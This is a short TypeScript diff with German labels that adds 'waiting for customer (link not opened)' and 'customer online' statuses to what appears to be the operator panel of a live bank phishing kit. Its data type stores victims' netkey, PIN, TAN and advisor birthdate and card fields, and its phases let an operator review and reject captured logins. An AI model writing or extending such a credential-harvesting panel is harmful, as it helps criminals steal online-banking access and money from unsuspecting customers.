@@ -24,7 +24,8 @@ type AuthRow = {
 type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };
 
 const PHASE_LABEL: Record<string, string> = {
-  login: "Wartet auf Login",
+  waiting: "Wartet auf Kunde (Link nicht geöffnet)",
+  login: "Kunde online – Login",
   login_review: "Login prüfen",
   login_rejected: "Login abgelehnt",
   berater: "Berater-Verifizierung (Kunde)",
